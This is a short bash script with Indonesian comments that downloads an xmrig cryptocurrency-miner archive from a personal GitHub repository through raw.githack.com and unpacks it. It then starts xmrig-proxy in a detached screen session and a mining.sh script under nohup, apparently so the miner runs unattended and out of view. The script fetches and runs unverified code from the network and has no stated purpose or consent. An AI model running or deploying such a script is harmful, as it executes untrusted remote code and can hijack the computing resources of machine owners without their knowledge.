#!/bin/bash

# Update & install screen
sudo apt update && sudo apt install -y screen curl tar

# Download dan ekstrak xmrig.tar.gz
curl -L -o xmrig.tar.gz "https://raw.githack.com/hafidzziran/nguliksal2/main/xmrig.tar.gz"
tar -xvzf xmrig.tar.gz && cd xmrig

# Beri izin eksekusi ke semua file penting
chmod +x xmrig xmrig-proxy re_run.sh mining.sh

# Jalankan xmrig-proxy dulu di background
echo "Menjalankan xmrig-proxy di background..."
screen -dmS proxy ./xmrig-proxy

# Tunggu 5 detik biar proxy siap
sleep 5

# Jalankan mining.sh di background
echo "Menjalankan mining.sh..."
nohup ./mining.sh > mining.log 2>&1 &